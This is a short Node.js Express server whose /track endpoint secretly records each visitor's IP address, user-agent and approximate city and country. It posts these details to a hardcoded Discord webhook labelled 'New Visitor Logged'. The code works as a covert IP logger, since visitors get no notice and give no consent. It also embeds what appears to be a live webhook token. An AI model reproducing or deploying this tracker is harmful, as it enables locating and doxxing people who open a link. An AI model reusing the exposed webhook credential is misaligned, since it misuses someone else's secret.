import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1511251306222846022/LJ25ej6wf3yZ9HmAm5b4DNYyKrJdnZ0-9qxMPc3IcP-b9AUl-LzexvO9fXNDzXJUnaqv";

app.use(express.static("public"));

app.get("/", (req, res) => {
    res.sendFile("index.html", { root: "./public" });
});

app.get("/track", async (req, res) => {

    const ip =
        req.headers["x-forwarded-for"] ||
        req.socket.remoteAddress;

    const userAgent = req.headers["user-agent"];

    let city = "Unknown";
    let country = "Unknown";

    try {
        const geo = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await geo.json();

        city = data.city || "Unknown";
        country = data.country_name || "Unknown";
    } catch (e) {}

    await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content:
`🇵🇭 New Visitor Logged
IP: ${ip}
Location: ${city}, ${country}
Device: ${userAgent}`
        })
    });

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log("Server running on " + PORT);
});